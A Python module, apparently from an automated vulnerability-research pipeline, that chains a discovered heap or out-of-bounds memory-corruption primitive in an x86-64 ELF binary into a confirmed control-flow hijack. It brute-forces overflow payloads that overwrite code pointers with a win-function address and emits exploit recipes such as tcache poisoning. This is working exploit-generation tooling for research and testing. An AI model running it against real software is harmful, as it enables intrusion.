"""Primitive chaining: turn a discovered heap / out-of-bounds primitive into a DEMONSTRATED
control-flow hijack (L3), or an L2 exploitation recipe when a live win is not reachable.

The `heap_trace` (double-free / UAF / heap-overflow) and `oob_index` (CWE-129) stages discover a
memory-corruption PRIMITIVE but file a Finding that goes nowhere. This stage consumes that lead and
attempts to finish the chain: when the target has a reachable win function (a flag printer / shell
spawner, via `exploit.find_win`), it drives the primitive's menu option to overwrite an adjacent
CODE pointer with the win address, triggers the use, and CONFIRMS control reached the win under the
ptrace debugger -- with the same negative-control causation proof `build_exploit` uses. On success
it files an L3 `verified` poc; otherwise it emits the concrete `aaheg` technique + target recipe as
L2 analyst guidance. Native x86-64 / ELF; the live-confirm path is non-PIE (a PIE win needs a
leak, which stays analyst-gated). Deterministic. """
from __future__ import annotations

import shutil
import struct
import sys
import tempfile
from pathlib import Path

from ...jobs.registry import register_stage

# NOTE: cross-subpackage imports (..dynamic, ..fuzz, sibling poc modules) are done LAZILY inside the
# functions below -- importing at module load creates a poc <-> dynamic import cycle (poc.__init__
# imports this module, which would import dynamic.heap_discover, which imports back into poc).

CHAIN_STAGE = "chain_primitive"
TOOL_VERSION = "chain-1"
_NL = b"\n"
# CWE -> the aaheg vuln class the discovered primitive represents.
_VCLASS = {"CWE-415": "double_free", "CWE-416": "uaf", "CWE-122": "heap_overflow",
           "CWE-129": "oob_write"}
_LEAD_DETECTORS = ("heap_trace", "oob_index")


def _p64(v: int) -> bytes:
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def _drive_overflow(fields, payload: bytes, *, idx: bytes = b"1", num: bytes = b"999") -> bytes:
    """One invocation of an option whose LAST string field carries the raw overflow `payload`
    (filler + the code address). A leading size field is driven large so the copy is unbounded."""
    last_str = max((i for i, f in enumerate(fields) if f == "str"), default=len(fields) - 1)
    out = bytearray()
    for i, f in enumerate(fields):
        if i == last_str:
            out += payload + _NL
        elif f == "idx":
            out += idx + _NL
        elif f == "num":
            out += num + _NL
        else:
            out += b"AAAA" + _NL
    if not fields:                                       # option with no learned fields
        out += payload + _NL
    return bytes(out)


def _lead_finding(conn, target):
    """The discovered primitive to chain: the highest-confidence heap_trace / oob_index finding."""
    from ...db.dao import FindingDAO
    leads = [f for f in FindingDAO(conn).list_by_target(target.id)
             if f.detector in _LEAD_DETECTORS and f.cwe in _VCLASS]
    return max(leads, key=lambda f: f.confidence, default=None)


def _recipe(vclass: str, win, target_bytes: bytes) -> dict:
    """An aaheg technique + concrete write target when a live hijack is not demonstrable."""
    from . import aaheg
    goal = (aaheg.Goal(kind="control_flow", value=(win[1] if win else 0),
                       trigger="overwrite a called code pointer with the win address")
            if win else aaheg.Goal(kind="arbitrary_write"))
    if vclass == "oob_write":
        # not a heap technique: the index escapes the array bounds -> write through the OOB slot
        return {"technique": "oob-index-write", "goal": goal.kind,
                "note": ("write a chosen value through the out-of-bounds array slot; aim it at a "
                         "saved return / GOT entry / function pointer, then trigger its use")}
    plan = aaheg.plan_exploit(aaheg.Vuln(vclass=vclass), goal)
    plan["technique"] = plan.get("technique") or (plan.get("advisory_alternatives") or [{}])[0].get(
        "technique", "tcache-poison")
    return plan


def chain_primitive_stage(ctx) -> dict:
    from ...db.dao import CallEdgeDAO, StringDAO, TargetDAO
    from ..dynamic import sandbox
    from ..dynamic.heap_discover import _crawl_menu_model
    from ..fuzz import menu
    from . import exploit
    from .capture import make_capture, materialize_helper
    target = TargetDAO(ctx.conn).get(ctx.target_id) if ctx.target_id else None
    if target is None:
        raise ValueError("chain_primitive requires a target_id")
    host = sandbox.host_arch()
    if (target.arch and target.arch != host) or (target.file_type or "").lower() not in ("elf", ""):
        ctx.emit("chain.done", payload={"applicable": False,
                 "note": "primitive chaining is native x86-64 / ELF only"})
        return {}

    lead = _lead_finding(ctx.conn, target)
    if lead is None:
        ctx.emit("chain.done", payload={"applicable": False,
                 "note": "no heap / out-of-bounds primitive discovered to chain"})
        ctx.progress(pct=100, msg="no primitive lead to chain")
        return {}
    vclass = _VCLASS[lead.cwe]

    target_bytes = ctx.content.path(target.sha256).read_bytes()
    functions = exploit.elf_functions(target_bytes)
    edges = CallEdgeDAO(ctx.conn).list_by_target(target.id)
    win = exploit.find_win(functions, call_edges=edges)
    win = win if win[0] else None
    pie = (target.mitigations or {}).get("pie") == "on"

    # Without a reachable win, or on a PIE image (the win address needs a runtime leak), we cannot
    # DEMONSTRATE the hijack here -- emit the concrete technique + target recipe as L2 guidance.
    if win is None or pie:
        recipe = _recipe(vclass, win, target_bytes)
        why = ("no reachable win function (a leak-based libc/one-gadget chain is analyst-gated)"
               if win is None else "PIE: the win address needs a runtime leak first")
        _file_recipe(ctx, target, lead, vclass, win, recipe, why)
        ctx.emit("chain.done", payload={"applicable": True, "confirmed": False, "vclass": vclass,
                 "win": win[0] if win else None, "recipe": recipe.get("technique"), "note": why})
        ctx.progress(pct=100, msg=f"L2 recipe for {vclass} (live hijack not demonstrable: {why})")
        return {"metrics": {"chained": False, "vclass": vclass}}

    win_name, win_addr = win
    workdir = Path(tempfile.mkdtemp(prefix="lykos-chain-"))
    sandbox.protect_dir(getattr(ctx.content, "root", None))
    try:
        exe = workdir / "target.bin"
        exe.write_bytes(target_bytes)
        exe.chmod(0o755)
        strings = [x.value for x in StringDAO(ctx.conn).list_by_target(target.id)
                   if getattr(x, "value", None)]
        opts = menu.detect_menu(strings)
        model = _crawl_menu_model(workdir, exe, opts) if opts else {}
        alloc = next((o for o in opts if o in model and menu._is_alloc(model[o])), None)
        # prime TWO adjacent objects: a heap overflow overwrites the NEIGHBOUR's code pointer.
        prime = (2 * (alloc.encode() + _NL + menu._fill(model[alloc]))) if alloc else b""
        # options that WRITE user data (a string field) can carry the code-pointer overwrite;
        # any option may be the one that later USES (calls) the corrupted pointer.
        writers = [o for o in opts if o in model and "str" in model[o]] or opts
        triggers = list(opts) + [None]

        helper = materialize_helper()
        capture = make_capture(ctx, helper, str(exe), "stdin", [], 8, sys.executable)
        try:
            found = _search_hijack(ctx, capture, prime, model, writers, triggers, win_addr)
        finally:
            shutil.rmtree(helper.parent, ignore_errors=True)

        if not found:
            recipe = _recipe(vclass, win, target_bytes)
            _file_recipe(ctx, target, lead, vclass, win, recipe,
                         f"drove {vclass} at every writer/offset/trigger but control never "
                         f"reached {win_name}")
            ctx.emit("chain.done", payload={"applicable": True, "confirmed": False,
                     "vclass": vclass, "win": win_name})
            ctx.progress(pct=100, msg=f"{vclass} chain to {win_name} not confirmed (L2 recipe)")
            return {"metrics": {"chained": False, "vclass": vclass}}

        seq, writer, off, trig = found
        return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq, off, writer, trig)
    finally:
        shutil.rmtree(workdir, ignore_errors=True)


def _search_hijack(ctx, capture, prime, model, writers, triggers, win_addr):
    """Overwrite an adjacent code pointer with `win_addr` and confirm the trigger calls it.

    Search the (writer option, overwrite offset, trigger option) space: place win_addr at each
    8-byte offset of an over-long payload from a data-writing option, then drive each candidate
    trigger. Confirm = the win breakpoint is hit AND a negative control (win bytes replaced) does
    NOT hit it, proving the overwrite caused arrival. Bounded; early-exits on the first hijack."""
    from ..fuzz import menu
    from . import exploit
    attempts = 0
    for writer in writers:
        wf = model.get(writer, [])
        for widx in (b"0", b"1"):                        # object whose buffer we overflow
            for off in range(8, 72, 8):
                drive = writer.encode() + _NL + _drive_overflow(
                    wf, b"A" * off + _p64(win_addr), idx=widx)
                for trig in triggers:
                    # the object the trigger uses: usually the one ADJACENT to the overflow.
                    for tidx in ((None,) if trig is None else (b"1", b"0")):
                        if ctx.should_cancel() or attempts >= 260:
                            return None
                        attempts += 1
                        tail = b"" if trig is None else (
                            trig.encode() + _NL + menu._fill(model.get(trig, []), idx=tidx))
                        seq = prime + drive + tail
                        if not exploit.reached(capture(seq, breakpoints=[win_addr]), win_addr):
                            continue
                        neg = prime + writer.encode() + _NL + _drive_overflow(
                            wf, b"A" * off + b"C" * 8, idx=widx) + tail
                        if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                            continue                     # reached without the overwrite -> not ours
                        ctx.progress(msg=f"hijack: option {writer} (obj {widx.decode()}) writes "
                                         f"a code pointer at +{off} -> win reached")
                        return seq, writer, off, trig
    return None


def _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq, off, writer, trig):
    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    input_sha = ctx.put_artifact("chain-exploit-input", data=seq)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{vclass}->control-flow", "offset": off, "target": win_name,
            "tool_version": TOOL_VERSION}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(),
                        seq, meta, b"", "stdin", [], None,
                        primitive={"type": vclass, "target": win_name, "offset": off,
                                   "confirmed": True})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    trg = "program exit / normal use" if trig is None else f"menu option {trig}"
    eff = (f"working exploit ({vclass} -> control-flow hijack): menu option {writer} overwrites a "
           f"code pointer at +{off} with {win_name} (0x{win_addr:x}); {trg} then calls it, "
           f"arrival confirmed under the debugger with a passing negative control.")
    fd = FindingDAO(ctx.conn)
    cand = {
        "cwe": lead.cwe, "title": "Control-flow hijack (demonstrated): L3 working exploit",
        "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
        "confidence": 0.99, "authoritative": True, "title_only": True,
        "dedup_key": f"chain:{vclass}:{target.id}",
        "function_addr": None, "site_addr": None, "site_detail": win_name,
        "evidence": [{"channel": "effects", "detail": __import__("json").dumps([{
            "kind": "rce", "title": "Control-flow hijack", "status": "demonstrated", "detail": eff,
            "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                      "note": eff}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
             "win": win_name, "offset": off, "writer": writer, "trigger": trig,
             "bundle": bundle_sha})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED: {vclass} -> {win_name} (option {writer} +{off})")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "offset": off}}


def _file_recipe(ctx, target, lead, vclass, win, recipe, why) -> None:
    """L2 guidance: the concrete technique + target to finish the chain by hand."""
    from ...db.dao import FindingDAO
    tech = recipe.get("technique", "heap-technique")
    tgt = f" -> {win[0]} (0x{win[1]:x})" if win else ""
    detail = (f"{vclass} primitive can be chained via {tech}{tgt}, but a live hijack was not "
              f"demonstrated here ({why}). {recipe.get('note', '')}").strip()
    FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
        "cwe": lead.cwe, "title": f"Exploitation recipe: {vclass} -> {tech}",
        "severity": "high", "detector": "chain_primitive", "state": "corroborated",
        "confidence": 0.5, "dedup_key": f"chain-recipe:{vclass}:{target.id}",
        "site_detail": tech,
        "evidence": [{"channel": "chain", "detail": detail}]})


def register() -> None:
    register_stage(CHAIN_STAGE, chain_primitive_stage, resource_class="cpu",
                   tool="ptrace", tool_version=TOOL_VERSION)


def enqueue_chain(queue, target, *, params=None, force: bool = True):
    return queue.enqueue(target.case_id, CHAIN_STAGE, target_id=target.id,
                         params=params or {}, force=force)
